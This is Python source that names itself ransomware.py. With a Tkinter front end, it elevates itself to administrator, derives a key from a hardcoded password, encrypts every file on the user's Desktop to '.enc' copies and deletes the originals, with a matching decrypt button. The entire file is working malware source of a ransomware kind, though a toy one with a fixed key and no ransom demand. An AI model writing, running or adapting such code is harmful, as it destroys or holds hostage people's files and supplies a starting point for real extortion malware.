import ctypes
import sys
from tkinter import messagebox, Tk, Button
from cryptography.hazmat.primitives.kdf.scrypt import Scrypt
from cryptography.fernet import Fernet
import base64
import os

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if not is_admin():
    ctypes.windll.shell32.ShellExecuteW(
        None, "runas", sys.executable, " ".join(sys.argv), None, 1
    )
    sys.exit()

password = "password"

def derive_key(password):
    kdf = Scrypt(salt=b"", length=32, n=2**14, r=8, p=1)
    return base64.urlsafe_b64encode(kdf.derive(password.encode()))

key = derive_key(password)

def encrypt_directory(directory, key):
    try:
        f = Fernet(key)
        for root, _, files in os.walk(directory):
            for file in files:
                # Skip desktop.ini and ransomware.py
                if file.lower() in ["desktop.ini", "ransomware.py"]:
                    continue
                filepath = os.path.join(root, file)
                with open(filepath, "rb") as file_obj:
                    file_data = file_obj.read()
                encrypted_data = f.encrypt(file_data)
                encrypted_filepath = filepath + ".enc"
                with open(encrypted_filepath, "wb") as file_obj:
                    file_obj.write(encrypted_data)
                os.remove(filepath)  # Delete the original file
        messagebox.showinfo("Success", "All files encrypted successfully!")
    except Exception as e:
        messagebox.showerror("Error", f"Encryption failed: {e}")

def decrypt_directory(directory, key):
    try:
        f = Fernet(key)
        for root, _, files in os.walk(directory):
            for file in files:
                # Process only files with the .enc extension
                if not file.endswith(".enc"):
                    continue
                filepath = os.path.join(root, file)
                with open(filepath, "rb") as file_obj:
                    encrypted_data = file_obj.read()
                decrypted_data = f.decrypt(encrypted_data)
                decrypted_filepath = filepath[:-4]  # Remove the .enc extension
                with open(decrypted_filepath, "wb") as file_obj:
                    file_obj.write(decrypted_data)
                os.remove(filepath)  # Delete the encrypted file
        messagebox.showinfo("Success", "All files decrypted successfully!")
    except Exception as e:
        messagebox.showerror("Error", f"Decryption failed: {e}")

def encrypt_desktop():
    desktop_path = os.path.join(os.environ["USERPROFILE"], "Desktop")  # Desktop path
    encrypt_directory(desktop_path, key)

def decrypt_desktop():
    desktop_path = os.path.join(os.environ["USERPROFILE"], "Desktop")  # Desktop path
    decrypt_directory(desktop_path, key)

root = Tk()
root.title("File Encryptor/Decryptor")

# Set window size explicitly to ensure visibility
root.geometry("300x150")  # Adjust the width and height as needed

encrypt_button = Button(root, text="Encrypt All in Desktop", command=encrypt_desktop)
encrypt_button.pack(pady=10)

decrypt_button = Button(root, text="Decrypt All in Desktop", command=decrypt_desktop)
decrypt_button.pack(pady=10)

root.mainloop()